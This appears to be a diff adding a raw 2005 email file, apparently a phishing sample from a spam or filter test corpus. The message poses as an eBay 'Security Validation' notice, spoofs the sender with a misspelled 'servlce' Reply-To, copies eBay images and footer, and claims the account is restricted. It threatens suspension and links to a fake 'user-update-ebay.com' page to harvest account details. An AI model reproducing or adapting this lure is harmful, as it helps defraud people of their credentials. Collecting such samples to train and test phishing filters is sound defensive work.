@@ -1,0 +1,183 @@
+From nobody Sun Jan 25 13:49:56 2015
+Return-Path: <user@mail.example.com>
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.6.4])
+ by example.com (Postfix) with ESMTP id EA5722A88C
+ for <user@example.com>; Sat,  3 Sep 2005 15:36:12 -0400 (EDT)
+Received: by mail.example.com (Example mail relay)
+ id E5521621C99; Sat,  3 Sep 2005 15:36:12 -0400 (EDT)
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.3.6])
+ by mail.example.com (Example mail relay) with ESMTP id BBB78621C92
+ for <user@example.com>; Sat,  3 Sep 2005 15:36:11 -0400 (EDT)
+Received: (from user@localhost) by mail.example.com id PAA20748
+ for user@example.com; Sat, 3 Sep 2005 15:36:11 -0400
+Received: from athena.securityssl.net (cpanel23.fuitadnet.com [67.15.40.13])
+ by mail.example.com with ESMTP id PAA20740
+ for <user@example.com>; Sat, 3 Sep 2005 15:36:10 -0400
+Received: from jerry by athena.securityssl.net with local (Exim 4.43)
+ id 1EBdkJ-000274-Hd
+ for user@example.com; Sat, 03 Sep 2005 14:32:11 -0500
+To: user@example.com
+Subject: Security : Your eBay user have a problem !
+From: <service@eBay.com>
+Reply-To: servlce@eBay.com
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: 8bit
+Message-Id: <E1EBdkJ-000274-Hd@athena.securityssl.net>
+Date: Sat, 03 Sep 2005 14:32:11 -0500
+X-AntiAbuse: This header was added to track abuse,
+ please include it with any abuse report
+X-AntiAbuse: Primary Hostname - athena.securityssl.net
+X-AntiAbuse: Original Domain - example.com
+X-AntiAbuse: Originator/Caller UID/GID - [33874 2376] / [47 12]
+X-AntiAbuse: Sender Address Domain - athena.securityssl.net
+Content-Length: 7888
+Lines: 141
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 129
+
+<table cellSpacing="0" cellPadding="0" width="82%" bgColor="white" border="0">
+  <tr>
+    <td noWrap width="1%">
+    <img src="http://pics.ebaystatic.com/aw/pics/email/syiSessions/hdrLeft_13x39.gif" width="13" height="39"></td>
+    <td noWrap width="96%" background="http://pics.ebaystatic.com/aw/pics/email/syiSessions/imgSpan_5x39.gif">
+    <span class="SectionTitle"><font size="4"><b> Security Validation -- 
+    Respond Now</b></font></span></td>
+    <td vAlign="bottom" noWrap width="3%">
+    <img alt="eBay" src="http://pics.ebaystatic.com/aw/pics/email/syiSessions/hdrRight_90x39.gif" width="82" height="39"></td>
+  </tr>
+</table>
+<table cellSpacing="0" cellPadding="0" width="863" border="0">
+  <tr>
+    <td width="10">
+    <img height="1" src="http://pics.ebaystatic.com/aw/pics/s.gif" width="10"></td>
+    <td width="1096">
+    <table cellSpacing="0" cellPadding="0" width="929" border="0">
+      <tr>
+        <td width="934">
+        <table style="border-left: 1px solid #9999cc; border-right: 1px solid #9999cc; border-bottom: 1px solid #9999cc" width="932" bgColor="#eeeef8" border="0" height="14">
+          <tr>
+            <td style="padding-left: 8px" height="10" width="917">
+            <font face="Arial, Verdana" size="2">eBay sent this message on 
+            behalf of an eBay member services. Responses sent using email will 
+            go to the eBay member services directly and will include your email address. 
+            Click the <b>Respond To This Notification</b> button below to send 
+            your response via E-Mail (your email address will not be included).</font>
+            </td>
+          </tr>
+        </table>
+        </td>
+      </tr>
+    </table>
+    </td>
+  </tr>
+</table>
+<table cellSpacing="0" cellPadding="0" width="622" border="0">
+  <tr>
+    <td width="23">
+    <img title alt=" " src="https://securepics.ebaystatic.com/aw/pics/s.gif" width="1" height="1"></td>
+  </tr>
+</table>
+<table cellSpacing="0" cellPadding="0" width="784" border="0">
+  <tr>
+    <td width="10">  </td>
+    <td vAlign="top" width="1118">
+    <table cellSpacing="0" cellPadding="0" width="861" border="0">
+      <tr>
+        <td vAlign="top" width="935">
+        <table cellSpacing="0" cellPadding="0" width="826" border="0">
+          <tr>
+            <td width="834">
+            <table cellSpacing="0" cellPadding="1" width="752" align="center" bgColor="#9999cc" border="0" height="266">
+              <tr bgColor="#9999cc" height="26">
+                <td height="6" width="1125"> </td>
+              </tr>
+              <tr>
+                <td height="264" width="1125">
+                <table cellSpacing="0" cellPadding="0" width="746" align="center" border="0" height="99">
+                  <tr bgColor="#c6c6c6">
+                    <td width="818" height="1">
+                    <img src="http://pics.ebaystatic.com/aw/pics/s.gif" width="1" height="1"></td>
+                  </tr>
+                  <tr bgColor="#ffffff">
+                    <td width="818" height="90">
+                    <table cellSpacing="0" cellPadding="4" width="864" height="190">
+                      <tr>
+                        <td vAlign="top" width="1036" height="182">
+                        <font face="Verdana, Arial, Helvetica, sans-serif" size="2">
+                        During our regular update and verification of the 
+                        accounts, we could not verify your current information.Either your information has changed or it is incomplete.</font><p>
+                        <font face="Verdana, Arial, Helvetica, sans-serif" size="2">
+                        As a result, your access to bid or buy on eBay has been 
+                        restricted. To start using fully your eBay account, 
+                        please update and verify your information by responding 
+                        this notification.</font></p>
+                        <p>
+                        <a target="_blank" href="http://www.user-update-ebay.com/ebay/Update/SignInUser/dlll282user/InfoUser/">
+                        <img border="0" src="http://pics.ebaystatic.com/aw/pics//email/btnRespond.gif" width="193" height="22"></a></p>
+                        <p><font size="2" face="Verdana">If you do not respond 
+                        by Aug-11-2005 your account may be suspended for 
+                        security reasons.</font></p>
+                        <p><span class="ebay"><font face="Verdana" size="2">
+                        Note: If this is the second time you receiving this 
+                        notice, it might be because you have made a mistake when 
+                        you entered your details or the account was not updated.</font></span></p>
+                        <p><font size="2" face="Verdana">Regards, </font>
+                        <font face="Arial, Verdana" size="2"><br>
+ </font></p>
+                        <table height="104" cellSpacing="0" cellPadding="0" width="920" border="0">
+                          <tr class="help" vAlign="top">
+                            <td class="navigation" width="970" height="104">
+                            <hr class="FooterSeparator" xmlns:x="urn:schemas-microsoft-com:xslt" xmlns:co="CheckoutV3" xmlns:ebay="eBayV3" color="#C0C0C0" size="1">
+                            <table cellSpacing="0" cellPadding="0" width="897" border="0" xmlns:x="urn:schemas-microsoft-com:xslt" xmlns:co="CheckoutV3" xmlns:ebay="eBayV3">
+                              <tr>
+                                <td width="897"><br>
+                                <font face="Arial, Verdana" color="#666666" size="1">  
+                                This eBay notice was sent to you based on your 
+                                eBay account preferences. To unsubscribe from 
+                                this eBay notice,
+                                <a target="helpwin" href="http://cgi4.aol.ebay.com/ws/eBayISAPI.dll?OptinLoginShow&ssPageName=ADME:X:EOAS:US:11">click here</a>. If you would like to receive 
+                                this email in text only,
+                                <a target="helpwin" href="http://cgi4.aol.ebay.com/ws/eBayISAPI.dll?OptinLoginShow&ssPageName=ADME:X:EOAS:US:12">click here</a>.
+                                <p> As outlined in our User Agreement, eBay will 
+                                periodically send you information about site 
+                                changes and enhancements. Visit our
+                                <a target="helpwin" href="http://pages.ebay.com/help/policies/privacy-policy.html?ssPageName=ADME:X:EOAS:US:14">Privacy Policy</a> and
+                                <a target="helpwin" href="http://pages.ebay.com/help/policies/user-agreement.html?ssPageName=ADME:X:EOAS:US:13">User Agreement</a> if you have any questions.
+                                </p>
+                                <p align="center">Copyright © 2005 eBay Inc. All 
+                                Rights Reserved.<br>
+                                Designated trademarks and brands are the 
+                                property of their respective owners. </p>
+                                <p align="center">eBay and the eBay logo are 
+                                trademarks of eBay Inc. </font></td>
+                              </tr>
+                            </table>
+                            </td>
+                          </tr>
+                        </table>
+                        </td>
+                        <td vAlign="top" align="middle" width="218" height="182"> </td>
+                      </tr>
+                    </table>
+                    </td>
+                  </tr>
+                </table>
+                </td>
+              </tr>
+            </table>
+            </td>
+          </tr>
+        </table>
+        </td>
+      </tr>
+    </table>
+    </td>
+  </tr>
+</table>
+
+
